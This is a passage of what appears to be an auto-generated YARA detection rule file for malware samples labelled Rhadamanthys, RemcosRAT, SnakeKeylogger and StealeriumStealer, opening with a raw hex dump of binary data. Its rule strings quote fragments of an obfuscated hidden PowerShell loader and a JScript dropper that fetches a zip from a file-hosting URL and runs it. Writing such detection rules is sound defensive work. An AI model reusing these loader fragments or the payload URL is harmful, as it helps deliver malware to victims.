90BE0100CCD300009ED60000ECB70100A0D60000D8D6000098BD0100D8D6000010D7000098BD010010D70000C3D7000008B80100CCD7000050D8000014B8010050D80000D7D8000090BE0100F0D80000D6D9000028B80100D8D900001CDA000098BD010030DA000054DA000058B8010060DA000078DA000060B8010080DA000081DA000064B8010090DA000091DA000068B8010094DA0000B7DA00006CB80100B8DA0000DDDA00008CB80100E0DA0000FDDA000008CB010008DB00003EDB000098BD0100C0DB000001DC0000ACB8010004DC000067DC0000A8B4010068DC000085DC000008CB010088DC000090DE0000CCB8010090DE000015DF0000A8B4010018DF0000E7DF0000A8B4010004E0000044E0000008CB010044E00000D9E0000098BD0100DCE00000BFE10000E8B80100C0E1000020E9000014B9010020E90000FFE9000038B9010000EA000053EA0000A8B4010054EA0000B3EA000008CB0100BCEA00009CEB0000A8B401009CEB0000C3EB000008CB0100C4EB000027EC0000A8B4010028EC000059EC0000A8B40100C8EC0000EEEC000008CB0100F0EC00007CED000090BE01007CED00006CEF000064B901006CEF000026F0000084B9010028F00000B8F00000A8B90100B8F000002DF30000B0B9010030F300000EF50000CCB9010010F5000038F5000008CB010068F60000E1F7000054C30100E4F700003BF80000A8B401003CF80000B1F80000FCB90100B4F80000F9F80000A8B90100FCF8000043F90000A8B901005CF9000020FB00001CBA010020FB000034FB000068B6010034FB0000A9FC00002CBA0100B4FC00004EFD000098BD010050FD000023FE000054C30100BCFF00002200010078BB010030000100DA00010044BA0100DC0001005001010008CB010050010100F501010054BA0100200201007902010084BA010090020100DE02010090BA0100E00201008A03010098BA01008C0301000504010054C301000804010054040100A8B401005404010040050100C0BA01004C0501001608010000BB010018080100AE08010028BB0100B00801000E0A010038BB0100100A01008E0A010060BB0100900A01007E0E010070BB0100800E0100EC0E010078BB0100EC0E0100F60F010070BB0100F80F0100E010010080BB0100F0100100B711010090BB0100D01101008512010098BB010088120100C312010028CE0100C4120100E612010008CB0100E81201006213010098BD010064130100CA1301009CBB0100CC130100A3140100C0BB0100A41401006015010098BD01006015010023160100E8BB0100241601005B160100A8B401005C160100AA17010010BC01007418010088190100E4CA010088190100721A0100ECCA0100741A0100891A010008CB01008C1A0100A11A010008CB0100A41A0100BF1A0100A8B40100C01A0100DB1A0100A8B40100DC1A0100871B010010CB0100881B01000F1C010028CB0100101C0100B11C010038CB0100B41C0100051D010054CB0100081D0100311E010074CB0100341E0100771E0100A8B40100781E0100AA1E0100A8B40100AC1E01000A1F010098BD01000C1F0100FC1F01008CCB0100FC1F01007B200100A8B901007C20010019210100A8B90100342101007621010060B5010090210100C1230100ACCB0100C4230100BB240100C8CB0100BC2401009C280100E0CB01009C280100352A0100F8CB0100382A0100092B010010CC01000C2B0100402C010028CC0100402C0100D52C010068B60100D82C0100FC2C010028CE0100FC2C0100B52D010054C30100B82D0100082F010040CC0100082F0100922F010090BE01009C2F0100C32F010008CB0100D02F01000B30010098BD01000C30010035300100A8B40100483001008130010098BD010084300100A731010068B70100A8310100F931010008CB0100FC3101008533010060CC010088330100CA3301009CCC0100F0330100C3340100BCCC0100C4340100D6360100E4CC0100D8360100DA38010020CD0100DC3801008C39010050CD01008C3901004D3A010078CD0100503A0100883C010090CD0100883C010055410100A8CD01005841010079410100A8B401007C410100A1430100C4CD0100CC4301004A440100A8B901004C4401004B450100DCCD01004C4501004B460100DCCD01004C4601001847010098BD010018470100DE470100F4CD0100E047010095480100FCCD010098480100A44B010014CE0100A44B0100CB4B010028CE0100CC4B0100F94B010008CB0100004C0100114C010008CB0100144C0100314C0100A8B40100344C0100B04C010030CE0100B04C0100CF4C0100A8B40100E04C0100204D010058CE0100344D0100FF52010060CE010000530100CB58010060CE0100CC5801002E61010080CE010030610100E36B0100A4CE0100006C0100106C0100C8CE0100506C0100696E0100D0CE0100706E01008E6E010010B701008E6E0100A46E010010B70100A46E0100BF6E010010B70100BF6E0100E36E010010B70100E36E0100016F010010B70100016F01001C6F010010B70100216F01003C6F010010B701003C6F01005A6F010010B70100606F0100826F010010B70100826F01009B6F010010B701009B6F0100B66F010010B70100B66F0100D16F010010B70100D16F0100EC6F010010B70100EC6F01000770010010B70100077001002F70010010B70100377001005270010010B70100527001006C70010010B701006C7001008570010010B701007C720100C27201004CCB0100C2720100D872010010B70100E27201000B73010010B701000B7301002373010010B70100237301001774010010B7010023740100B2740100D8CC0100B2740100DE74010010B70100F07401004A750100D0CA01004C7501008275010008CB010090750100A875010008CB0100A8750100DA75010008CB010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000001001800000018000080000000000000000004000000000001000100000030000080000000000000000004000000000001000904000048000000587002005A010000E4040000000000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E504150414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E475858504144008001006C00000040A448A450A458A470A478A480A488A4A0A4A8A4D0A4D8A4E0A4E8A4F0A4F8A400A508A510A518A520A528A530A538A540A548A568A570A578A5D0A5D8A5D8AEE8AEF8AE08AF18AF28AF38AF48AF58AF68AF78AF88AF98AFA8AFB8AFC8AFD8AFE8AFF8AF00900100D000000008A018A028A0C0A8C8A8D0A8D8A8E0A8E8A8F0A8F8A800A908A910A918A920A928A930A938A940A948A950A958A960A968A970A978A980A988A990A998A9A0A9A8A9B0A9B8A9C0A9C8A9D0A9D8A9E0A9E8A9F0A9F8A900AA08AA10AA18AA20AA28AA30AA38AA40AA48AA50AA58AA60AA68AA70AA78AA80AA88AA90AA98AAA0AAA8AAB0AAB8AAC0AAC8AAD0AAD8AAE0AAE8AAF0AAF8AA00AB08AB10AB18AB20AB28AB30AB38AB40AB48AB50AB58AB60AB68AB70AB78AB80AB88AB90AB98ABA0ABA8ABB0ABB8ABC0AB00A0010044000000A0A8A8A860A968A970A978A980A988A990A998A9A0A980AA88AA90AAF8AB00AC08AC10AC18AC20AC28AC30AC38AC40AC48AC70AD38AE40AE48AE50AE00E00100AC00000000A008A010A030A0F0A1F8A1B0A4B8A4C0A4C8A4D0A4D8A4E0A4E8A4F0A4F8A400A510A5F0AC00AE08AE10AE18AE20AE28AE30AE38AE40AE48AE50AE58AE60AE68AE70AE78AE80AE88AE90AE98AEA0AEA8AEB0AEB8AEC0AEC8AED0AED8AEE0AEE8AEF0AEF8AE00AF08AF10AF18AF20AF28AF30AF38AF40AF48AF50AF68AF70AF78AF80AF88AF90AF98AFA0AFA8AFB0AFB8AFC0AFC8AFD0AFD8AFE0AFE8AFF0AFF8AF000000F00100CC00000000A008A010A018A020A028A030A038A040A048A050A058A060A068A070A078A080A088A090A098A0A0A0A8A0B0A0B8A028A148A168A188A1A8A1E8A100A208A210A218A220A228A238A240A248A250A258A260A268A270A278A280A288A298A2A0A2A8A2B0A2B8A2C0A2C8A2D0A2D8A2E0A208A328A350A378A3A0A3C0A3E8A310A410AC20AC58AC88ACB8ACC8ACD8ACE8ACF8AC08AD18AD28AD38AD48AD58AD68AD78AD88AD98ADA8ADB8ADC8ADD8ADE8ADF8AD08AE18AE28AE38AE48AE58AE68AE78AE0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' */ /* score: '30.00'*/
      $s2 = "MjRCMDBBMDAwMDQ4ODFDNDkwMEEwMDAwNUY1RTVEQzNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M0ODg5NUMyNDIwNTU1NzQxNTQ0ODgxRUNBMDA2MDAwMDQ4OEIwNTQxNzUwMTAw" ascii /* base64 encoded string '24B00A00004881C4900A00005F5E5DC3CCCCCCCCCCCCCCCCCC48895C2420555741544881ECA0060000488B0541750100' */ /* score: '27.00'*/
      $s3 = "MDEwQzAwMDBCOTFDMDAwMDAwRTg5NzA5MDAwMEI5RkYwMDAwMDBFOEREMDUwMDAwRTg0ODIyMDAwMDg1QzA3NTIyODMzRDc5NjgwMTAwMDI3NDA1RThENjBCMDAwMEI5" ascii /* base64 encoded string '010C0000B91C000000E897090000B9FF000000E8DD050000E84822000085C07522833D79680100027405E8D60B0000B9' */ /* score: '24.00'*/
      $s4 = "NEM4QkRCNEQ4NURCMEY4NDlCMDEwMDAwNDU4NUVENzQxMUU4NDdFM0ZGRkY0QzhCRDg0ODYzNDcwNDRDMDNEOEVCMDM0QzhCREI0MTM4NUIxMDBGODQ3ODAxMDAwMDM5" ascii /* base64 encoded string '4C8BDB4D85DB0F849B0100004585ED7411E847E3FFFF4C8BD8486347044C03D8EB034C8BDB41385B100F847801000039' */ /* score: '24.00'*/
      $s5 = "NzA1MEJDMDAwMDAxMDAwMDAwMUZBMTAwMDAyREEyMDAwMEJGNkUwMTAwMDAwMDAwMDAxOTJEMEIwMDFCNjQ1MTAwMUI1NDUwMDAxQjM0NEYwMDFCMDE0QTAwMTREMDEy" ascii /* base64 encoded string '7050BC0000010000001FA100002DA20000BF6E010000000000192D0B001B6451001B5450001B344F001B014A0014D012' */ /* score: '24.00'*/
      $s6 = "MDEwMDAwMDA0ODZCQzkwRDBGQjY0QzBDNTgzQkMxNzUzMzhCNDQyNDY4NDg4QjhDMjQ0MDAxMDAwMDhCMDQ4MTg5ODQyNDE4MDEwMDAwOEI4NDI0MTgwMTAwMDA0ODhC" ascii /* base64 encoded string '01000000486BC90D0FB64C0C583BC175338B442468488B8C24400100008B0481898424180100008B842418010000488B' */ /* score: '24.00'*/
      $s7 = "MjQwODU3NDg4M0VDMjA0ODhCRkE0ODhCRDk0ODNCQ0E3NDIxRTg4RUZGRkZGRjgwN0YxMDAwNzQwRTQ4OEI1NzA4NDg4QkNCRTgyMEZGRkZGRkVCMDg0ODhCNDcwODQ4" ascii /* base64 encoded string '2408574883EC20488BFA488BD9483BCA7421E88EFFFFFF807F1000740E488B5708488BCBE820FFFFFFEB08488B470848' */ /* score: '24.00'*/
      $s8 = "NEM4OTRBMDg0ODhCODNCMDAwMDAwMDQ4ODk0MjA4NDg4RDgzQTgwMDAwMDA0ODg5MDI0ODhCODNCMDAwMDAwMDQ4ODkxMEZGNEI2OEZGNDM2MDhCMDM0ODg5OTNCMDAw" ascii /* base64 encoded string '4C894A08488B83B000000048894208488D83A8000000488902488B83B0000000488910FF4B68FF43608B03488993B000' */ /* score: '24.00'*/
      $s9 = "Qjk4M0Y4MDE3NTEyNDg4QkNCRTg1QjA1MDAwMDg1QzAwRjg0QzUwMDAwMDBFQkEyODNGODAyMEY4NEQ3MDAwMDAwODNGODAzNzUxMjQ4OEJDQkU4QkIwMzAwMDA4NUMw" ascii /* base64 encoded string 'B983F8017512488BCBE85B05000085C00F84C5000000EBA283F8020F84D700000083F8037512488BCBE8BB03000085C0' */ /* score: '24.00'*/
      $s10 = "RUIwQTgzRjgwMzc1MDU4MDRDM0IwODA4NDg4RDRDM0IxMEJBQTAwRjAwMDBGRjE1NjVBQjAwMDA4NUMwMEY4NEMyRkRGRkZGRkY0NDNCMENFQjBEODA0QzNCMDg0MDQ4" ascii /* base64 encoded string 'EB0A83F8037505804C3B0808488D4C3B10BAA00F0000FF1565AB000085C00F84C2FDFFFFFF443B0CEB0D804C3B084048' */ /* score: '24.00'*/
      $s11 = "OTRDMDQ4ODNDNDI4QzNDQ0NDNDg4RDA1QTlGNjAwMDA0ODg5MDE0ODhCMDJDNjQxMTAwMDQ4ODk0MTA4NDg4QkMxQzNDQ0NDQ0M0ODgzNzkwODAwNDg4RDA1OThGNjAw" ascii /* base64 encoded string '94C04883C428C3CCCC488D05A9F60000488901488B02C641100048894108488BC1C3CCCCCC4883790800488D0598F600' */ /* score: '24.00'*/
      $s12 = "MEQ0NDVEMDEwMDQ4OEIwQ0MxNDg4QjQ0MjQ2MDRDOEQ0QzI0NDg0ODhCMEMwODQ0MkJDNkZGMTVGOTlBMDAwMDg1QzA3NDBCMDM3NDI0NDg0NDNCRkU3RkI4RUIwOEZG" ascii /* base64 encoded string '0D445D0100488B0CC1488B4424604C8D4C2448488B0C08442BC6FF15F99A000085C0740B03742448443BFE7FB8EB08FF' */ /* score: '24.00'*/
      $s13 = "NEM4RDFDMDZFQjAzNEM4QkRCNEQ4NURCMEY4NEJFMDAwMDAwODVGNjc0MEY0ODYzNzcwNEU4OUVFOUZGRkY0QzhEMUMwNkVCMDM0QzhCREI0MTM4NUIxMDBGODQ5RTAw" ascii /* base64 encoded string '4C8D1C06EB034C8BDB4D85DB0F84BE00000085F6740F48637704E89EE9FFFF4C8D1C06EB034C8BDB41385B100F849E00' */ /* score: '24.00'*/
      $s14 = "NDA0MThCRkMwRjFGNDQwMDAwNDg4QjZCMDg0QzhCMDQyRjQ5ODNGODBGNzYxMjQ5OEIwODMzRDI0ODhCMDlGRjE1MjQ2QzAxMDA0Qzg5MjQyRkZGQzY0ODgzQzcwODNC" ascii /* base64 encoded string '40418BFC0F1F440000488B6B084C8B042F4983F80F7612498B0833D2488B09FF15246C01004C89242FFFC64883C7083B' */ /* score: '24.00'*/
      $s15 = "NDgzQkYwNzM2ODQ4NjM0NDI0NTg0OEI5RkZGRkZGRkZGRkZGRkY3RjQ4M0JDMTczNTQ0ODhEMENCMDQ4MDNDMDQ4MDNDOTQ4M0JDODcyNDVFODJDRURGRkZGNDg4QkY4" ascii /* base64 encoded string '483BF07368486344245848B9FFFFFFFFFFFFFF7F483BC17354488D0CB04803C04803C9483BC87245E82CEDFFFF488BF8' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__88556db8 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_88556db8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "88556db83f38d96d84a7a03aa667a66f25d5e6d3b71557db346f48eba429ca00"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v8.24.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__b7406ca9 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_b7406ca9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7406ca9aa55a1047b23901fb2116d3c8879c8fff565e729628d9d151e72621e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v4.64.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "UEU9US5TMUk" fullword ascii /* base64 encoded string 'PE=Q.S1I' */ /* score: '11.00'*/
      $s6 = "zOqz:\\" fullword ascii /* score: '10.00'*/
      $s7 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s8 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s9 = "Z - MX" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b9ef7445 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b9ef7445.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9ef744551e414b8f59a4148f48425b5730e928a170d5161e7ddea959d50dc15"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dogfights ($fortvivle){ $discoloureds=1;do {$canalside+=$fortvivle[$di" ascii /* score: '28.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dogfights ($fortvivle){ $discoloureds=1;do {$canalside+=$fortvivle[$di" ascii /* score: '25.00'*/
      $s3 = "asmart (Dogfights '-$-G-l-o b-A-L :-i.n-A l-t-E-r A-B-l Y =-( t-E,S T.--P-a-t-H- -$-L A-n-D-s r-e,T,s )') ;Ultrasmart (Dogfights" ascii /* score: '12.00'*/
      $s4 = " 'i$,GiL O b Ail,: b I,viA.ain e die = $igiLio.b.aili:iciUiR R A,N Tiwioirim,+ +i%% $ uiR tie,hiaiViE . CioiuiNit') ;$snakeship=" ascii /* score: '11.00'*/
      $s5 = "$urtehave[$bivaanede]}$benediktinerklostrets121=460266;$babroot=27166;Ultrasmart (Dogfights 'X$XgXl o.bXa.lX:Xo V e R.P rXIXn TX" ascii /* score: '10.00'*/
      $s6 = "  =F i=r=e=f=o x /=1=4=1=. 0';$fleretagersejendommes=Dogfights ' Ugsge r -gAgg EgngT';$snakeship=Dogfights '+h+t+t p+s+:+/ /,s+e" ascii /* score: '8.00'*/
      $s7 = " $approksimationernes);$snakeship=$urtehave[0];$jambolana=(Dogfights ',$ GIlIOIbIa L,:Iw aIrIfIU LI9.7.= NIEIw,- OIb jIE cITI IS" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 9KB and
      all of them
}

rule RemcosRAT_signature__be8817cf {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_be8817cf.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be8817cf2fd720e68a960498df53ac488d87d4c691548fdaea16860344598aef"
   strings:
      $x1 = "function a(){var D=['MSXML2.XMLHTTP','BuildPath','SaveToFile','Files','send','open','1268220JVnmoN','Scripting.FileSystemObject'" ascii /* score: '34.00'*/
      $s2 = "/files.catbox.moe/kp50gv.zip','WScript.Shell','Items','238509zdmkbx','%TEMP%','random','Open','atEnd','GetFolder','CreateObject'" ascii /* score: '27.00'*/
      $s3 = "1673360DOGPcp','Close','NameSpace','Shell.Application','Type','GetExtensionName','responseBody','length','.zip','Name','charAt'," ascii /* score: '18.00'*/
      $s4 = "function a(){var D=['MSXML2.XMLHTTP','BuildPath','SaveToFile','Files','send','open','1268220JVnmoN','Scripting.FileSystemObject'" ascii /* score: '13.00'*/
      $s5 = "7f',h:'0x16f',i:'0x187',j:'0x17a',k:'0x18d',l:'0x16c'},y={c:'0x16a',d:'0x176',e:'0x172'},s=b,c=WScript[s(C.c)](s(C.d)),d=WScript" ascii /* score: '10.00'*/
      $s6 = "nction l(n,o){var v=s,p=WScript[v(A.c)](v('0x16e')),q=p[v(A.d)](n);if(!q)return![];if(!d[v(A.e)](o))d['CreateFolder'](o);return " ascii /* score: '10.00'*/
      $s7 = "e');p[w('0x17e')](q),p[w('0x168')](),c['Run']('\\x22'+q+'\\x22',0x1,![]);break;}o[w('0x17b')]();}}try{k(g,h)&&(l(h,i)&&(WScript[" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__09197780 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_09197780.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09197780e4de9aa1abaa44d580b3102138c6d3a03ab46b518f88f8c40dc882df"
   strings:
      $s1 = "eafa.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s7 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s8 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s9 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s10 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s11 = "csvContent" fullword ascii /* score: '9.00'*/
      $s12 = "gnciiins" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule StealeriumStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file StealeriumStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "287b8d3a5d0326958711e0802dbc5dc3ad7df0ee4c22ffafa7a95d3fd416f9fd"
   strings:
      $s1 = "xntQ.exe" fullword wide /* score: '22.00'*/
      $s2 = "<GetHabitsCompletedToday>b__13_0" fullword ascii /* score: '12.00'*/
      $s3 = "GetHabitCompletions" fullword ascii /* score: '12.00'*/
      $s4 = "<GetHabitCompletions>b__12_1" fullword ascii /* score: '12.00'*/
      $s5 = "get_CompletedDates" fullword ascii /* score: '12.00'*/
      $s6 = "GetHabitsCompletedToday" fullword ascii /* score: '12.00'*/
      $s7 = "<GetHabitCompletions>b__12_0" fullword ascii /* score: '12.00'*/
      $s8 = "GetTodayCompletionPercentage" fullword ascii /* score: '12.00'*/
      $s9 = "GetTotalCompletions" fullword ascii /* score: '12.00'*/
      $s10 = "<GetCompletedTodayCount>b__6_0" fullword ascii /* score: '12.00'*/
      $s11 = "GetHabitsNotCompletedToday" fullword ascii /* score: '12.00'*/
      $s12 = "<GetHabitsNotCompletedToday>b__14_0" fullword ascii /* score: '12.00'*/
      $s13 = "<GetTotalCompletions>b__10_0" fullword ascii /* score: '12.00'*/
      $s14 = "GetCompletedTodayCount" fullword ascii /* score: '12.00'*/
      $s15 = "XF8pQy/=T" fullword ascii /* base64 encoded string '\_)C/' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e36d13a1 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e36d13a1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e36d13a1a406cdb3b6f4d90653cb212d4c4f2e59ee7435fa43aa053ecb066b05"
   strings:
      $s1 = "sejw.exe" fullword wide /* score: '22.00'*/
      $s2 = "mailto:support@example.com" fullword wide /* score: '21.00'*/
      $s3 = "support@example.com" fullword wide /* score: '21.00'*/
      $s4 = "https://github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s5 = "github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s6 = "A simple and efficient number base converter that supports conversion between Binary (2), Octal (8), Decimal (10), and Hexadecim" wide /* score: '16.00'*/
      $s7 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s8 = "get_TargetBase" fullword ascii /* score: '14.00'*/
      $s9 = "sejw.pdb" fullword ascii /* score: '14.00'*/
      $s10 = "set_TargetBase" fullword ascii /* score: '14.00'*/
      $s11 = "<TargetBase>k__BackingField" fullword ascii /* score: '14.00'*/
      $s12 = "targetBase" fullword ascii /* score: '14.00'*/
      $s13 = "{0:HH:mm:ss} - {1} ({2}) " fullword wide /* score: '12.00'*/
      $s14 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s15 = "GetSelectedBase" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8c26e452 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8c26e452.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c26e45232a6156e0aa26e97891c87be699e0790bdf3f048fb9fde6b9b94e794"
   strings:
      $s1 = "BLsF.exe" fullword wide /* score: '22.00'*/
      $s2 = "BLsF.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "txtCommand" fullword wide /* score: '12.00'*/
      $s4 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s5 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s6 = "tbxContent" fullword wide /* score: '9.00'*/
      $s7 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s8 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s9 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e8333329 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e8333329.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e83333296efc27158b82016eb794f5dcc6ad9d5bf5c1519dfc382bd549f8a472"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD^V" fullword ascii /* score: '27.00'*/
      $s2 = "yGe.exe" fullword wide /* score: '19.00'*/
      $s3 = "!!!5!!!5!!!" fullword ascii /* score: '18.00'*/ /* hex encoded string 'U' */
      $s4 = "https://www.facebook.com/mohammed.telkhoukhe" fullword wide /* score: '17.00'*/
      $s5 = "https://www.instagram.com/m.tel18/" fullword wide /* score: '17.00'*/
      $s6 = "https://www.linkedin.com/in/mohamed-telkhoukhe-419019246/" fullword wide /* score: '17.00'*/
      $s7 = "logoPictureBox.Image" fullword wide /* score: '12.00'*/
      $s8 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s9 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s10 = "yGe.pdb" fullword ascii /* score: '11.00'*/
      $s11 = "!!!E!!!" fullword ascii /* score: '10.00'*/
      $s12 = "!!!#!!!" fullword ascii /* score: '10.00'*/
      $s13 = "!!!<!!!" fullword ascii /* score: '10.00'*/
      $s14 = "!!!M!!!" fullword ascii /* score: '10.00'*/
      $s15 = "!!!n!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__805e59d1 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_805e59d1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "805e59d142a1b2539d79732417912388b5ceb70cedee8f736d755705c9ae977a"
   strings:
      $s1 = "UbBi.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
